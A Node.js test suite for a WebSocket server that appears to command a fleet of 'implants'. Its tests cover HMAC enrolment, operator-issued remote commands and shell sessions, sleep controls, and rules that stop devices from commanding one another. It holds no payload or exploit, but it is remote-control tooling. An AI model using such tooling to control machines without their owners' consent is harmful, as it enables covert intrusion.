'use strict';
/* Verifies the server-authoritative command policy.
 *
 * The rule under test: a registered device is reply-only. It may answer the
 * server and stream terminal output, and it may NOT originate work for
 * another device. `command`, `term-start`, `term-input` and `signal` must all
 * be refused, and a viewer must still be able to command a peer normally.
 *
 * Run: node --test test/
 */
const test = require('node:test');
const assert = require('node:assert');
const { WebSocketServer, WebSocket } = require('ws');
const { spawn } = require('node:child_process');
const path = require('node:path');
const os = require('node:os');
const fs = require('node:fs');
const crypto = require('node:crypto');
const identity = require('../identity');

const PORT = 34711;
const SETUP_KEY = 'test-setup-key';
const USER = 'op';
const PASS = 'op-pass';
const URL = `ws://127.0.0.1:${PORT}`;

/* An agent stand-in: 32 random bytes used directly as the HMAC key, which is
   exactly what the C agent does with BCryptGenRandom output. The tests drive it
   through Node rather than by hand, so a protocol change breaks these the same
   way it breaks the implant. */
function makeAgentIdentity() {
  const secret = crypto.randomBytes(identity.SECRET_LEN);
  return { secret, secretB64: secret.toString('base64') };
}

let child;

function startServer() {
  return new Promise((resolve, reject) => {
    child = spawn(process.execPath, [path.join(__dirname, '..', 'server.js')], {
      env: {
        ...process.env,
        PORT: String(PORT),
        SETUP_KEY,
        DASH_USER: USER,
        DASH_PASS: PASS,
        /* A scratch DB per run, so a test can never be affected by — or leak
           into — the developer's real implant registry. */
        FORZER_DB: path.join(os.tmpdir(), `forzer-test-${process.pid}.db`),
        /* These tests deliberately fail authentication twice. The throttle is
           real and keys on 127.0.0.1, which is every socket in this file, so
           the default threshold is eight real attempts away from turning a
           future "and one more bad proof" test into a lockout that fails
           everything after it. The throttle has its own file
           (test/throttle.test.js) with its own server and its own limits. */
        FORZER_AUTH_MAX_FAILURES: '1000',
      },
      stdio: ['ignore', 'pipe', 'pipe'],
    });
    const onData = (d) => { if (String(d).includes('listening')) resolve(); };
    child.stdout.on('data', onData);
    child.stderr.on('data', (d) => process.stderr.write(`[server] ${d}`));
    child.on('exit', (c) => reject(new Error(`server exited early (${c})`)));
    setTimeout(() => reject(new Error('server did not start in 5s')), 5000);
  });
}

/* Open a socket and collect every message it receives. */
function open(collect = true) {
  const ws = new WebSocket(URL);
  ws.msgs = [];
  ws.closed = null;
  if (collect) ws.on('message', (d) => ws.msgs.push(JSON.parse(String(d))));
  ws.on('close', (code, reason) => { ws.closed = { code, reason: String(reason) }; });
  return new Promise((resolve, reject) => {
    ws.on('open', () => resolve(ws));
    ws.on('error', reject);
  });
}

const next = (ws, type, ms = 2000) => new Promise((resolve, reject) => {
  const hit = ws.msgs.find((m) => m.type === type);
  if (hit) return resolve(hit);
  const t = setTimeout(() => reject(new Error(`no '${type}' within ${ms}ms; got ${ws.msgs.map(m => m.type)}`)), ms);
  ws.on('message', (d) => {
    const m = JSON.parse(String(d));
    if (m.type === type) { clearTimeout(t); resolve(m); }
  });
});

/* opts.agent  reuse an existing keypair (to test the same implant reconnecting)
   opts.badProof send a wrong HMAC, to test rejection
   opts.setupKey / opts.secret override the wire fields */
async function registerDevice(opts = {}) {
  const agent = opts.agent || makeAgentIdentity();
  const ws = await open();
  ws.send(JSON.stringify({
    type: 'register',
    name: opts.name || 'bot-a',
    secret: opts.secret || agent.secretB64,
    setupKey: opts.setupKey === undefined ? SETUP_KEY : opts.setupKey,
    /* Advertise the full set unless a test is exercising a peer that predates
       an op. The server refuses work a peer says it cannot do, so a device
       that stays silent is not a neutral default here. */
    proto: opts.proto === undefined ? 2 : opts.proto,
    ops: opts.ops === undefined
      ? ['exec', 'shell.open', 'shell.input', 'shell.close', 'sleep', 'update']
      : opts.ops,
  }));
  const ch = await next(ws, 'challenge');
  const nonce = Buffer.from(ch.nonce, 'base64');
  /* No key agreement: the enrolled secret *is* the HMAC key. */
  const secret = agent.secret;
  ws.send(JSON.stringify({
    type: 'auth',
    proof: (opts.badProof ? crypto.randomBytes(32) : identity.clientProof(secret, nonce)).toString('base64'),
  }));
  const reg = await next(ws, 'registered');
  if (opts.badProof || opts.expectError) {
    assert.ok(reg.error, `expected a rejection, got ${JSON.stringify(reg)}`);
    return { ws, id: null, error: reg.error };
  }
  assert.equal(reg.error, undefined, `handshake failed: ${reg.error}`);
  /* The server proved itself too. Verify, so a failure here means the mutual
     half broke rather than the test being lenient. */
  assert.ok(identity.checkProof(
    identity.serverProof(secret, nonce), Buffer.from(reg.serverProof, 'base64')
  ), 'server proof did not verify');
  return { ws, id: reg.id, secret, nonce, agent };
}

async function authedViewer() {
  const ws = await open();
  ws.send(JSON.stringify({ type: 'dashboard', user: USER, pass: PASS }));
  await next(ws, 'dashboard-ready');
  return ws;
}

const closeAll = (...socks) => socks.forEach((s) => s && s.readyState === 1 && s.close());

test.before(async () => { await startServer(); });
test.after(() => {
  if (child) child.kill();
  for (const suffix of ['', '-wal', '-shm']) {
    try {
      fs.unlinkSync(path.join(os.tmpdir(), `forzer-test-${process.pid}.db${suffix}`));
    } catch { /* may not exist */ }
  }
});

test('an implant authenticates and gets a stable, key-derived id', async () => {
  const first = await registerDevice();
  assert.match(first.id, /^[0-9a-f]{16}$/, `expected a 16-hex id, got ${first.id}`);
  /* The id must be derivable from the pinned key, not random: that is the whole
     point of the change. */
  assert.equal(first.id, identity.implantId(first.agent.secret));
  closeAll(first.ws);
});

test('the same key keeps the same id across reconnects', async () => {
  const agent = makeAgentIdentity();
  const a = await registerDevice({ agent, name: 'stable' });
  closeAll(a.ws);
  await new Promise((r) => setTimeout(r, 150));

  const b = await registerDevice({ agent, name: 'stable' });
  assert.equal(b.id, a.id, 'implant id changed across a reconnect');
  closeAll(b.ws);
});

test('a wrong proof is refused and the socket is closed', async () => {
  const d = await registerDevice({ badProof: true });
  assert.match(d.error, /authentication failed/);
  await new Promise((r) => setTimeout(r, 200));
  assert.ok(d.ws.closed, 'a failed proof must close the socket');
  assert.equal(d.ws.closed.code, 1008);
});

test('a socket that never answers the challenge gets no implant', async () => {
  const agent = makeAgentIdentity();
  const ws = await open();
  ws.send(JSON.stringify({ type: 'register', name: 'silent', secret: agent.secretB64, setupKey: SETUP_KEY }));
  await next(ws, 'challenge');
  /* No auth frame. The socket must stay unauthenticated: it may not command
     anything, and it must not appear as an implant. */
  const v = await authedViewer();
  v.msgs.length = 0;
  assert.ok(!v.msgs.some((m) => m.type === 'command-result'), 'unauthenticated socket produced output');
  closeAll(ws, v);
});

test('a bad setup key never reaches the challenge', async () => {
  const ws = await open();
  ws.send(JSON.stringify({
    type: 'register', name: 'x', secret: makeAgentIdentity().secretB64, setupKey: 'wrong',
  }));
  const reg = await next(ws, 'registered');
  assert.match(reg.error, /setup key/);
  /* close() is queued, so the client's close event lands a tick later. */
  await new Promise((r) => setTimeout(r, 200));
  assert.ok(ws.closed, 'socket should close');
});

test('a malformed secret is rejected before any auth work', async () => {
  for (const bad of ['', 'AAAA', 'not-base64!!', Buffer.alloc(64).toString('base64')]) {
    const ws = await open();
    ws.send(JSON.stringify({ type: 'register', name: 'x', secret: bad, setupKey: SETUP_KEY }));
    const reg = await next(ws, 'registered');
    assert.match(reg.error, /secret/, `accepted a malformed secret: ${bad}`);
    closeAll(ws);
  }
});

test('a reconnect does not churn the id when the server restarts', async () => {
  /* The in-memory store lost every device on redeploy. This asserts the
     registry survives: re-enrolling the same key is idempotent. */
  const agent = makeAgentIdentity();
  const a = await registerDevice({ agent, name: 'persist' });
  closeAll(a.ws);
  const b = await registerDevice({ agent, name: 'persist' });
  assert.equal(b.id, a.id);
  closeAll(b.ws);
});

test('a device cannot originate `command` at another peer', async () => {
  const a = await registerDevice();
  const b = await registerDevice();
  a.ws.msgs.length = 0;
  b.ws.msgs.length = 0;

  a.ws.send(JSON.stringify({ type: 'command', to: b.id, id: 'x1', data: 'whoami' }));

  // The offending socket is closed, not merely ignored.
  await new Promise((r) => setTimeout(r, 300));
  assert.ok(a.ws.closed, 'device socket should have been closed');
  assert.equal(a.ws.closed.code, 1008);

  // And the target never saw a command.
  assert.ok(!b.ws.msgs.some((m) => m.type === 'command'),
    `peer received ${JSON.stringify(b.ws.msgs)}`);
  closeAll(b.ws);
});

test('a device cannot originate `sleep`', async () => {
  /* `sleep` is a viewer-routable liveness control. If a device could send it,
     any box could silence any other box at will — and, more to the point of
     this test, the origination policy has to stay a single explicit list. */
  const a = await registerDevice();
  const b = await registerDevice();
  a.ws.send(JSON.stringify({ type: 'sleep', to: b.id, ms: 3600000 }));
  await new Promise((r) => setTimeout(r, 300));
  assert.ok(a.ws.closed, 'device socket should have been closed');
  assert.equal(a.ws.closed.code, 1008);
  assert.ok(!b.ws.msgs.some((m) => m.type === 'sleep'),
    `peer received ${JSON.stringify(b.ws.msgs)}`);
  closeAll(b.ws);
});

test('the roster goes to viewers, not to implants', async () => {
  /* The agent parses none of the roster — its own handler says so. Pushing it
     to every implant meant one host enrolling or dropping woke every box on
     the mesh to receive a document none of them read, and the cost grew with
     the fleet. The roster is an operator view. */
  const a = await registerDevice();
  const viewer = await authedViewer();
  /* handleDashboard pushes a roster right after dashboard-ready, so let it
     land before clearing — otherwise `next()` below resolves on the roster
     that predates the new enrolment. */
  await new Promise((r) => setTimeout(r, 150));
  viewer.msgs.length = 0;
  a.ws.msgs.length = 0;

  await registerDevice({ name: 'roster-b' });

  assert.ok(!a.ws.msgs.some((m) => m.type === 'implants'),
    `implant received an operator roster: ${JSON.stringify(a.ws.msgs)}`);
  const pushed = await next(viewer, 'implants');
  assert.ok(Array.isArray(pushed.implants), 'viewer should get the roster');
  assert.ok(pushed.implants.some((i) => i.name === 'roster-b'), 'roster should list the new implant');
  closeAll(a.ws, viewer);
});

test('the operator roster and registry listing never carry an implant secret', async () => {
  /* The registry stores each implant's shared secret, and under ECDH those
     columns held public material — leaking them was harmless. A secret column
     reaching an operator view would hand any logged-in viewer the ability to
     impersonate every device on the mesh.

     Asserted in both directions, because a test that only checks the output is
     vacuous if the output never contained the secret in the first place: the
     row must really hold it, and neither surface may report it. */
  const a = await registerDevice({ name: 'leak-check' });
  const secretB64 = a.agent.secretB64;

  const store = require('../store');
  const db = store.open(path.join(os.tmpdir(), `forzer-test-${process.pid}.db`));
  const row = db.prepare('SELECT secret FROM implants WHERE id = ?').get(a.id);
  const registry = new store.Registry(db);
  const listed = registry.list();
  db.close();
  assert.equal(row && row.secret, secretB64,
    'test is vacuous unless the registry really stores the secret');

  const mine = listed.find((i) => i.id === a.id);
  assert.ok(mine, 'the new implant should appear in the listing');
  assert.equal(mine.secret, undefined, `list() leaked the secret: ${JSON.stringify(mine)}`);
  assert.ok(!JSON.stringify(listed).includes(secretB64),
    'the secret appears somewhere in the listing');
  assert.ok(listed.every((i) => 'pubkey' in i === false), 'stale pre-PSK field still present');

  /* The roster pushed to a viewer is built from the live socket map rather than
     the registry, so it never had the secret — assert that so a refactor which
     routes it through list() cannot reintroduce the leak silently. */
  const viewer = await authedViewer();
  await new Promise((r) => setTimeout(r, 150));
  const pushed = await next(viewer, 'implants');
  assert.ok(!JSON.stringify(pushed).includes(secretB64),
    'the secret appears in the roster broadcast');
  closeAll(a.ws, viewer);
});

test('a viewer can tell a peer to go quiet, and the delay is capped', async () => {
  const dev = await registerDevice();
  const viewer = await authedViewer();
  dev.ws.msgs.length = 0;

  viewer.send(JSON.stringify({ type: 'sleep', to: dev.id, id: 'z1', ms: 900000 }));
  const got = await next(dev.ws, 'sleep');
  assert.equal(got.ms, 900000);
  assert.match(got.from, /^viewer:/, 'server must stamp a viewer: sender');
  assert.equal(dev.ws.closed, null, 'the relay must not close the socket itself');

  /* Out-of-range and nonsense values are clamped server-side, not passed on. */
  dev.ws.msgs.length = 0;
  viewer.send(JSON.stringify({ type: 'sleep', to: dev.id, id: 'z2', ms: 99999999 }));
  const capped = await next(dev.ws, 'sleep');
  assert.equal(capped.ms, 3600000, 'an hour is the ceiling');

  dev.ws.msgs.length = 0;
  viewer.send(JSON.stringify({ type: 'sleep', to: dev.id, id: 'z3', ms: -5 }));
  const floored = await next(dev.ws, 'sleep');
  assert.equal(floored.ms, 0, 'a negative delay must not become a huge unsigned one');
  closeAll(dev.ws, viewer);
});

test('`sleep` is fire-and-forget and leaves no viewer binding behind', async () => {
  /* Nothing ever answers a sleep, so binding the request id would strand an
     entry in the target's binding table — one per sleep, until it disconnects. */
  const dev = await registerDevice();
  const viewer = await authedViewer();
  for (let i = 0; i < 5; i++) {
    viewer.send(JSON.stringify({ type: 'sleep', to: dev.id, id: `b${i}`, ms: 1000 }));
  }
  await new Promise((r) => setTimeout(r, 250));
  viewer.msgs.length = 0;
  dev.ws.send(JSON.stringify({ type: 'command-result', to: dev.id, id: 'b0', data: 'x', rc: 0 }));
  await new Promise((r) => setTimeout(r, 250));
  assert.ok(!viewer.msgs.some((m) => m.id && String(m.id).startsWith('b')),
    `a sleep id was echoed back: ${JSON.stringify(viewer.msgs)}`);
  closeAll(dev.ws, viewer);
});

test('a device cannot originate `signal` (mesh relay is dead)', async () => {
  const a = await registerDevice();
  const b = await registerDevice();
  a.ws.msgs.length = 0;
  b.ws.msgs.length = 0;

  a.ws.send(JSON.stringify({ type: 'signal', to: b.id, data: 'candidate:1234' }));

  await new Promise((r) => setTimeout(r, 300));
  assert.ok(a.ws.closed, 'device socket should have been closed');
  assert.equal(a.ws.closed.code, 1008);
  assert.ok(!b.ws.msgs.some((m) => m.type === 'signal'),
    `peer received ${JSON.stringify(b.ws.msgs)}`);
  closeAll(b.ws);
});

test('a device cannot originate `term-start` / `term-input`', async () => {
  for (const type of ['term-start', 'term-input']) {
    const a = await registerDevice();
    a.ws.send(JSON.stringify({ type, to: a.id, id: 't1', data: 'dir\r' }));
    await new Promise((r) => setTimeout(r, 300));
    assert.ok(a.ws.closed, `${type} should have closed the socket`);
    assert.equal(a.ws.closed.code, 1008, type);
  }
});

test('`term-end` from a device is a reply, not an origination', async () => {
  /* The agent emits term-end when its own shell exits, so it has to stay in
     DEVICE_REUTABLE. What must not be possible is a device reaching *another*
     peer's viewer session with it — checked in the next test. */
  const a = await registerDevice();
  a.ws.send(JSON.stringify({ type: 'term-end', to: a.id, id: 'nobody' }));
  await new Promise((r) => setTimeout(r, 300));
  assert.equal(a.ws.closed, null, 'a device reporting its own session ended must not be disconnected');
  closeAll(a.ws);
});

test('an unauthenticated socket cannot originate `command`', async () => {
  const a = await registerDevice();
  const anon = await open();
  anon.send(JSON.stringify({ type: 'command', to: a.id, id: 'x2', data: 'whoami' }));
  await new Promise((r) => setTimeout(r, 300));
  assert.ok(anon.closed, 'unauthenticated socket should have been closed');
  assert.equal(anon.closed.code, 1008);
  assert.ok(!a.ws.msgs.some((m) => m.type === 'command'),
    `device received ${JSON.stringify(a.ws.msgs)}`);
  closeAll(a.ws);
});

test('a viewer CAN still command a peer, and the result routes back', async () => {
  const dev = await registerDevice();
  const viewer = await authedViewer();
  viewer.msgs.length = 0;
  dev.ws.msgs.length = 0;

  viewer.send(JSON.stringify({ type: 'command', to: dev.id, id: 'r1', data: 'echo hi' }));

  // The device receives it stamped as viewer traffic.
  const cmd = await next(dev.ws, 'command');
  assert.equal(cmd.to, dev.id);
  assert.equal(cmd.data, 'echo hi');
  assert.match(cmd.from, /^viewer:/, 'server must stamp a viewer: sender');

  // The device answers, echoing the id it was given. Note the reply uses
  // `cmd.id` and not the literal 'r1': the server namespaces the request id by
  // the viewer that owns it, and the viewer gets its own id back on the way
  // out. The device is a pure echo and never learns the client's numbering.
  dev.ws.send(JSON.stringify({ type: 'command-result', to: dev.id, id: cmd.id, data: 'hi\r\n', rc: 0 }));
  const res = await next(viewer, 'command-result');
  assert.equal(res.id, 'r1');
  assert.notEqual(cmd.id, 'r1', 'the id on the wire is namespaced, not the client id');
  assert.match(cmd.id, /:r1$/);
  assert.equal(res.data, 'hi\r\n');
  assert.equal(res.rc, 0);
  assert.equal(res.from, dev.id);
  closeAll(dev.ws, viewer);
});

test('a device result is routed to its own viewer, not another one', async () => {
  const dev = await registerDevice();
  const v1 = await authedViewer();
  const v2 = await authedViewer();
  v1.msgs.length = 0;
  v2.msgs.length = 0;

  v1.send(JSON.stringify({ type: 'command', to: dev.id, id: 'a1', data: 'one' }));
  v2.send(JSON.stringify({ type: 'command', to: dev.id, id: 'b1', data: 'two' }));
  await new Promise((r) => setTimeout(r, 200));
  const seen = new Map(dev.ws.msgs.map((m) => [m.data, m.id]));
  dev.ws.msgs.length = 0;

  dev.ws.send(JSON.stringify({ type: 'command-result', to: dev.id, id: seen.get('two'), data: 'TWO', rc: 0 }));
  await new Promise((r) => setTimeout(r, 200));

  assert.ok(v2.msgs.some((m) => m.id === 'b1'), 'asking viewer should get the result');
  assert.ok(!v1.msgs.some((m) => m.id === 'b1'), 'other viewer must not see it');
  closeAll(dev.ws, v1, v2);
});

test('two viewers using the SAME request id do not cross-deliver', async () => {
  /* Every `forzerctl` process numbers its own requests from c1, so two
     operators on two machines collide on the first request they both make —
     which is not a rare thing to arrange. Keyed on the bare id, the second
     binding replaced the first and the reply went to the session that bound
     last: one operator reading another operator's command output, and a
     `cancel` reply landing in the `run` waiting on the command it cancelled.
     This is the bug the namespacing above exists for. */
  const dev = await registerDevice();
  const v1 = await authedViewer();
  const v2 = await authedViewer();
  v1.msgs.length = 0;
  v2.msgs.length = 0;

  v1.send(JSON.stringify({ type: 'command', to: dev.id, id: 'c1', data: 'one' }));
  v2.send(JSON.stringify({ type: 'command', to: dev.id, id: 'c1', data: 'two' }));
  await new Promise((r) => setTimeout(r, 200));
  const seen = new Map(dev.ws.msgs.map((m) => [m.data, m.id]));
  dev.ws.msgs.length = 0;

  assert.notEqual(seen.get('one'), seen.get('two'),
    'the two requests must reach the device under different ids');

  /* v1's command finishes first; the reply must not wait for the right
     moment, it must go to the session that asked. */
  dev.ws.send(JSON.stringify({ type: 'command-result', to: dev.id, id: seen.get('one'), data: 'ONE', rc: 0 }));
  await new Promise((r) => setTimeout(r, 200));
  assert.ok(v1.msgs.some((m) => m.id === 'c1' && m.data === 'ONE'), 'v1 gets its own result');
  assert.ok(!v2.msgs.some((m) => m.type === 'command-result'),
    'v2 must not receive a result it never asked for');
  closeAll(dev.ws, v1, v2);
});

test('a device cannot forge terminal output into a viewer it does not serve', async () => {
  const devA = await registerDevice();
  const devB = await registerDevice();
  const viewer = await authedViewer();
  viewer.msgs.length = 0;

  // The viewer opened a session against devA. devB never got a binding, so
  // whatever id it invents has nowhere to land.
  viewer.send(JSON.stringify({ type: 'term-start', to: devA.id, id: 's1' }));
  await new Promise((r) => setTimeout(r, 200));
  devA.ws.msgs.length = 0;

  devB.ws.send(JSON.stringify({ type: 'term-data', to: devB.id, id: 's1', data: 'spoofed', rc: 0 }));
  await new Promise((r) => setTimeout(r, 300));

  assert.ok(!viewer.msgs.some((m) => m.data === 'spoofed'),
    'devB must not be able to write into devA viewer session');
  closeAll(devA.ws, devB.ws, viewer);
});

test('a device cannot terminate a viewer session on another peer', async () => {
  const devA = await registerDevice();
  const devB = await registerDevice();
  const viewer = await authedViewer();

  viewer.send(JSON.stringify({ type: 'term-start', to: devA.id, id: 'k1' }));
  await new Promise((r) => setTimeout(r, 250));
  assert.ok(viewer.msgs.length >= 0);

  // devB invents the same session id. The binding lives on devA's socket, so
  // devB's term-end reaches nobody and devB stays connected.
  devB.ws.send(JSON.stringify({ type: 'term-end', to: devB.id, id: 'k1' }));
  await new Promise((r) => setTimeout(r, 300));
  assert.equal(devB.ws.closed, null, 'devB must not be disconnected by its own reply');
  assert.ok(!viewer.msgs.some((m) => m.from === devB.id),
    'devA viewer session must not be touched by devB');
  closeAll(devA.ws, devB.ws, viewer);
});

test('a device answering its own session still works (term-data echo)', async () => {
  const dev = await registerDevice();
  const viewer = await authedViewer();
  viewer.msgs.length = 0;

  viewer.send(JSON.stringify({ type: 'term-start', to: dev.id, id: 's2' }));
  await new Promise((r) => setTimeout(r, 200));
  const started = await next(dev.ws, 'term-start');

  dev.ws.send(JSON.stringify({ type: 'term-data', to: dev.id, id: started.id, data: 'C:\\>', rc: 0 }));
  const out = await next(viewer, 'term-data');
  assert.equal(out.data, 'C:\\>');
  assert.equal(out.id, 's2');
  closeAll(dev.ws, viewer);
});

/* --------------------- op catalog, over the wire ---------------------- */

test('a viewer asking for a verb that does not exist gets an error, not silence',
  async () => {
    /* The old catch-all dropped anything it did not recognise, and dropping is
       indistinguishable from a peer that is merely slow. A typo and a dead box
       looked identical from the console. */
    const d = await registerDevice();
    const v = await authedViewer();
    v.send(JSON.stringify({ type: 'exfiltrate', to: d.id, id: 'bad1' }));

    const err = await next(v, 'command-error');
    assert.match(err.error, /unknown op "exfiltrate"/);
    /* The message has to be actionable: it lists what is actually available. */
    assert.match(err.error, /exec/);
    assert.ok(!d.ws.msgs.some((m) => m.type === 'exfiltrate'),
      'the peer must never see an op the server does not know');
    closeAll(d.ws); closeAll(v.ws);
  });

test('a viewer asking for an op the peer does not implement says so', async () => {
  /* Version skew, not a typo. The two must stay distinguishable or an
     operator cannot tell "I spelled it wrong" from "that box is old". */
  const d = await registerDevice({ name: 'old-box', ops: ['sleep'] });
  const v = await authedViewer();
  v.send(JSON.stringify({ type: 'command', to: d.id, id: 'skew1', data: 'whoami' }));

  const err = await next(v, 'command-error');
  assert.match(err.error, /not supported by this implant/);
  assert.doesNotMatch(err.error, /unknown op/);
  assert.ok(!d.ws.msgs.some((m) => m.type === 'command'),
    'an op the peer cannot do must not be relayed to it');
  closeAll(d.ws); closeAll(v.ws);
});

test('an op the peer does implement is relayed', async () => {
  const d = await registerDevice({ name: 'partial', ops: ['sleep'] });
  const v = await authedViewer();
  d.ws.msgs.length = 0;
  v.send(JSON.stringify({ type: 'sleep', to: d.id, id: 'ok1', ms: 1000 }));

  const got = await next(d.ws, 'sleep');
  assert.equal(got.ms, 1000);
  closeAll(d.ws); closeAll(v.ws);
});

test('a peer that advertises nothing is not locked out', async () => {
  /* An implant predating the advertisement field has said nothing, which is
     not the same as having said it supports nothing. Refusing every op would
     strand an entire old fleet with no way to fix it but an update. */
  const d = await registerDevice({ name: 'ancient', ops: [] });
  const v = await authedViewer();
  d.ws.msgs.length = 0;
  v.send(JSON.stringify({ type: 'command', to: d.id, id: 'old1', data: 'whoami' }));

  const got = await next(d.ws, 'command');
  assert.equal(got.data, 'whoami');
  closeAll(d.ws); closeAll(v.ws);
});

test('an implant cannot advertise an op that is not in the catalog', async () => {
  /* The advertised list is attacker-controlled text from a peer. It is
     normalised against the catalog before the roster shows it, so a box
     cannot put invented verbs in an operator's list. */
  const d = await registerDevice({ name: 'liar', ops: ['exec', 'rootkit', 'exec'] });
  const reg = d.ws.msgs.find((m) => m.type === 'registered');
  const v = await authedViewer();
  const roster = await next(v, 'implants');
  const me = roster.implants.find((i) => i.id === d.id);
  assert.ok(me, 'peer missing from roster');
  assert.deepStrictEqual(me.ops, ['exec'], 'unknown and duplicate ops must be dropped');
  assert.ok(!JSON.stringify(roster).includes('rootkit'));
  closeAll(d.ws); closeAll(v.ws);
});

test('the roster carries each peer\'s capabilities and protocol', async () => {
  /* The console greys out what a box cannot do rather than offering it and
     eating an error, and that only works if the roster says so. */
  const d = await registerDevice({ name: 'caps', ops: ['exec', 'sleep'], proto: 2 });
  const v = await authedViewer();
  const roster = await next(v, 'implants');
  const me = roster.implants.find((i) => i.id === d.id);
  assert.deepStrictEqual(me.ops, ['exec', 'sleep']);
  assert.equal(me.proto, 2);
  closeAll(d.ws); closeAll(v.ws);
});
